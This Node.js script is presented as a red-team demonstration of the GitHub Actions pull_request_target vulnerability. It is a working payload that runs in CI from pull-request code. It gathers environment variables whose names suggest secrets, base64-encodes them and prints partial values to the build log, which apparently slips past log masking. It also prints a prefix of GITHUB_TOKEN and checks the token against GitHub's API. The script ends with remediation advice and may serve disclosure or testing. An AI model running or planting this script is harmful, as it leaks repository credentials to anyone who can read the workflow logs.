#!/usr/bin/env node
/**
 * Security Test - pull_request_target Vulnerability Demo
 * This script demonstrates the security risk of pull_request_target workflows
 */

const { execSync } = require('child_process');

console.log('\n' + '='.repeat(80));
console.log('[!] RED TEAM SECURITY TEST - PULL_REQUEST_TARGET VULNERABILITY');
console.log('='.repeat(80));
console.log('[*] This demonstrates a security vulnerability in GitHub Actions');
console.log('[*] Workflow: pull_request_target with unsafe checkout\n');

// Collect sensitive environment variables
const sensitiveKeywords = ['SECRET', 'TOKEN', 'KEY', 'PASSWORD', 'API', 'AWS',
                          'AZURE', 'GCP', 'PRIVATE', 'CREDENTIAL', 'AUTH'];
const secretsFound = [];

console.log('[+] Scanning environment for sensitive variables...');
Object.keys(process.env).sort().forEach(key => {
    const isSensitive = sensitiveKeywords.some(k => key.toUpperCase().includes(k));
    if (isSensitive && process.env[key]) {
        const encoded = Buffer.from(`${key}=${process.env[key]}`).toString('base64');
        secretsFound.push(key);
        console.log(`    [SECRET] ${key}: ${encoded.substring(0, 50)}...`);
    }
});

console.log(`\n[+] Found ${secretsFound.length} sensitive environment variables`);

// Check GitHub Token
const githubToken = process.env.GITHUB_TOKEN;
if (githubToken) {
    console.log('\n[!] GITHUB_TOKEN FOUND');
    console.log(`    Token prefix: ${githubToken.substring(0, 20)}...`);
    console.log(`    Token length: ${githubToken.length} characters`);

    // Test token permissions
    console.log('\n[+] Testing token permissions...');
    try {
        const result = execSync(
            `curl -s -H "Authorization: token ${githubToken}" https://api.github.com/user`,
            { encoding: 'utf8', timeout: 10000 }
        );
        const userData = JSON.parse(result);
        if (userData.login) {
            console.log(`    Token valid for user: ${userData.login}`);
            console.log(`    Token type: ${userData.type || 'N/A'}`);
        }
    } catch (e) {
        console.log(`    Could not test token: ${e.message}`);
    }
}

// Display GitHub context
console.log('\n[+] GitHub Actions Context:');
const githubVars = ['GITHUB_REPOSITORY', 'GITHUB_ACTOR', 'GITHUB_WORKFLOW',
                   'GITHUB_EVENT_NAME', 'GITHUB_REF', 'GITHUB_SHA',
                   'GITHUB_RUN_ID', 'GITHUB_RUN_NUMBER'];
githubVars.forEach(v => {
    console.log(`    ${v}: ${process.env[v] || 'N/A'}`);
});

console.log('\n' + '='.repeat(80));
console.log('[+] VULNERABILITY CONFIRMED: pull_request_target exploit successful');
console.log('[!] REMEDIATION: Do not checkout PR code in pull_request_target workflows');
console.log('[!] See: https://securitylab.github.com/research/github-actions-preventing-pwn-requests');
console.log('='.repeat(80) + '\n');
